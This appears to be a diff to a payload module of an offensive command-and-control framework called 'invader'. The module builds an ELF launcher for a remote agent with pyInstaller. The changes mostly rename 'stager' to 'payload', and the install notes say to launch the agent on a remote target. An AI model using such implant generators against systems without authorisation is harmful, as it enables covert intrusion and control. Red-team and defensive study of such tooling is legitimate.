@@ -9,8 +9,8 @@ Install steps...
 -- try: 
 
 
-- copy into stagers directory
--- ./invader/lib/stagers/
+- copy into payloads directory
+-- ./invader/lib/payloads/
 
 - kick off the invader agent on a remote target
 -- /tmp/invader &
@@ -19,7 +19,7 @@ Install steps...
 
 """
 
-class Stager:
+class payload:
 
 	def __init__(self, mainMenu, params=[]):
 
@@ -31,21 +31,21 @@ class Stager:
 			'Description': ('Generates an ELF binary payload launcher for invader using pyInstaller.'),
 
 			'Comments': [
-				'Needs to have pyInstaller setup on the system you are creating the stager on. For debian based operatins systems try the following command: apt-get -y install python-pip && pip install pyinstaller'
+				'Needs to have pyInstaller setup on the system you are creating the payload on. For debian based operatins systems try the following command: apt-get -y install python-pip && pip install pyinstaller'
 			]
 		}
 
-		# any options needed by the stager, settable during runtime
+		# any options needed by the payload, settable during runtime
 		self.options = {
 			# format:
 			#   value_name : {description, required, default_value}
 			'Listener' : {
-				'Description'   :   'Listener to generate stager for.',
+				'Description'   :   'Listener to generate payload for.',
 				'Required'      :   True,
 				'Value'         :   ''
 			},
 			'Language' : {
-				'Description'   :   'Language of the stager to generate.',
+				'Description'   :   'Language of the payload to generate.',
 				'Required'      :   True,
 				'Value'         :   'python'
 			},
@@ -103,7 +103,7 @@ class Stager:
 			return ""
 		else:
 			# generate the launcher code
-			launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, userAgent=userAgent, safeChecks=safeChecks)
+			launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=encode, userAgent=userAgent, safeChecks=safeChecks)
 			if launcher == "":
 				print helpers.color("[!] Error in launcher command generation.")
 				return ""
@@ -118,10 +118,10 @@ class Stager:
 				cur.close()
 				
 				
-				stagerFFP_Str = self.mainMenu.installPath + "/data/agent/stagers/http.py"
-				stagerFFP_Str = os.path.join(self.mainMenu.installPath, "data/agent/stagers/http.py")
+				payloadFFP_Str = self.mainMenu.installPath + "/data/agent/payloads/http.py"
+				payloadFFP_Str = os.path.join(self.mainMenu.installPath, "data/agent/payloads/http.py")
 
-				filesToExtractImportsFrom_List.append(stagerFFP_Str)
+				filesToExtractImportsFrom_List.append(payloadFFP_Str)
 				
 				agentFFP_Str = self.mainMenu.installPath + "/data/agent/agent.py"
 				filesToExtractImportsFrom_List.append(agentFFP_Str)
